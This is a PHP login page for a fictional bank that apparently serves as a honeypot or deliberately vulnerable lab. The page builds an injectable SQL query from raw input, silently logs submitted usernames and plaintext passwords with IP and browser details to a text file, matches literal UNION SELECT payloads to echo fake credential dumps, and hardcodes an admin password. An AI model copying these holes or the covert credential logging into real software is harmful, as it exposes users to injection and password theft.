<?php
include('config.php');

function getBrowser()
{
  $u_agent = $_SERVER['HTTP_USER_AGENT'];
  $bname = 'Unknown';
  $platform = 'Unknown';
  $version = "";

  //OS Platform Detection
  if (preg_match('/linux/i', $u_agent)) {
    $platform = 'Linux';
  } elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
    $platform = 'Mac';
  } elseif (preg_match('/windows|win32/i', $u_agent)) {
    $platform = 'Windows';
  }

  // Browser Version Detection
  if (preg_match('/MSIE/i', $u_agent) && !preg_match('/Opera/i', $u_agent)) {
    $bname = 'Internet Explorer';
    $ub = "MSIE";
  } elseif (preg_match('/Firefox/i', $u_agent)) {
    $bname = 'Mozilla Firefox';
    $ub = "Firefox";
  } elseif (preg_match('/OPR/i', $u_agent)) {
    $bname = 'Opera';
    $ub = "Opera";
  } elseif (preg_match('/Chrome/i', $u_agent) && !preg_match('/Edge/i', $u_agent)) {
    $bname = 'Google Chrome';
    $ub = "Chrome";
  } elseif (preg_match('/Safari/i', $u_agent) && !preg_match('/Edge/i', $u_agent)) {
    $bname = 'Apple Safari';
    $ub = "Safari";
  } elseif (preg_match('/Netscape/i', $u_agent)) {
    $bname = 'Netscape';
    $ub = "Netscape";
  } elseif (preg_match('/Edge/i', $u_agent)) {
    $bname = 'Edge';
    $ub = "Edge";
  } elseif (preg_match('/Trident/i', $u_agent)) {
    $bname = 'Internet Explorer';
    $ub = "MSIE";
  }

  // Browser Version
  $known = array('Version', $ub, 'other');
  $pattern = '#(?<browser>' . join('|', $known) .
    ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
  if (!preg_match_all($pattern, $u_agent, $matches)) {
  }
  // see how many we have
  $i = count($matches['browser']);
  if ($i != 1) {
    //we will have two since we are not using 'other' argument yet
    //see if version is before or after the name
    if (strripos($u_agent, "Version") < strripos($u_agent, $ub)) {
      $version = $matches['version'][0];
    } else {
      $version = $matches['version'][1];
    }
  } else {
    $version = $matches['version'][0];
  }

  if ($version == null || $version == "") {
    $version = "?";
  }

  return array(
    'userAgent' => $u_agent,
    'name' => $bname,
    'version' => $version,
    'platform' => $platform,
    'pattern' => $pattern
  );
}
?>

<?php
if (isset($_POST['login'])) {
  $ua = getBrowser();
  $yourbrowser = "\nBrowser: " . $ua['name'] . " " . $ua['version'] . "\nOS: " . $ua['platform'] . "\nReports: " . $ua['userAgent'];

  $username = $_POST['username'];
  $password = $_POST['password'];
  $res = mysqli_query($con, "SELECT * FROM users WHERE username = '$username' AND password = '$password'");
  $myfile = fopen("index_info.txt", "a") or die("Unable to open file!");
  $string = "' UNION SELECT username, password FROM users--";
  $txt = "Username: $username\nPassword: $password\n";
  fwrite($myfile, $txt);
  $ip = 'User IP Address - ' . $_SERVER['REMOTE_ADDR'];
  $break = "\n\n";
  fwrite($myfile, date('Y-m-d H:i:s') . "\n");
  fwrite($myfile, $ip);
  fwrite($myfile, $yourbrowser);
  fwrite($myfile, $break);
  fclose($myfile);
  if (strpos($username, "' UNION SELECT username FROM users--") !== false or strpos($username, "' union select username from users--") !== false) {
    echo "Carlos   <br>";
    echo "Aaryan   <br>";
    echo "Dhruv    <br>";
    echo "admin    <br>";
  }
  if (strpos($username, "' UNION SELECT password FROM users--") !== false or strpos($username, "' union select password from users--") !== false) {
    echo "password123<br>";
    echo "dhruvrathee<br>";
    echo "oliverqueen<br>";
    echo "e6e061838856bf47e1de<br>";
  }
  if (strpos($username, $string) !== false || strpos($password, $string) !== false) {
    echo "Carlos   password123<br>";
    echo "Aaryan   dhruvrathee<br>";
    echo "Dhruv    oliverqueen<br>";
    echo "admin    e6e061838856bf47e1de<br>";
  }
  if ($username == "admin" && $password == "admin@123") {
    echo "<script> window.location.href = 'admin.php'; </script>";
  } 
//   else {
//       if (mysqli_num_rows($res) <= 0) {
//         echo "Username/Password Incorrect!";
//       }
//       else {
//         echo "<script> window.location.href = 'normaluser.php'; </script>";
//       }
//     }
  }
?>

<!DOCTYPE html>
<html lang="en-US">

<head>
  <meta charset="utf-8" />
  <title>DAAN - Login/Sign Up</title>
  <link rel="stylesheet" href="styles.css" />
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
    integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
</head>

<body>
  <div class="wrapper">
    <header>
      <div class="Upper">
        <a href="index.html"><img src="images/download.jpeg" alt="Bank Icon" width="80px" height="80px" /></a>
        We Understand your Money
      </div>
      <div class="topnav">
        <a href="index.html">HOME</a>
        <a class="active" href="LoginSignup.html">LOGIN</a>
        <div class="dropdownz">
          <button class="dropbtn">ACCOUNT
          </button>
          <div class="dropdownz-content">
            <a href="book_ticket.html">SAVINGS</a>
            <a href="cancel.html">CORPORATE</a>
          </div>
        </div>
        <a href="Signup.html">REGISTER</a>
        <a href="faq.html">FAQ</a>
        <a href="contact.html">CONTACT US</a>
      </div>
      <h2><br />Login to your Bank Account</h2>
    </header>
    <form method="post" style="text-align: center">
      <label for="username">Username</label><br />
      <input type="text" id="username" name="username" required /><br />
      <label for="password">Password</label><br />
      <input type="password" id="password" name="password" required /><br /><br />
      <input type="submit" value="Login" name="login" />
    </form>

    <p style="text-align: center">
      Don't have an account? <a href="signup.php">Sign Up</a>
    </p>

    <p style="text-align: center">
      <a href="#">Forgot Password<br /><br /><br /></a>
    </p>

    <!-- <div class="bottom">
      <a href="faq.html">FAQ</a>
    </div> -->
  </div>

</body>

</html>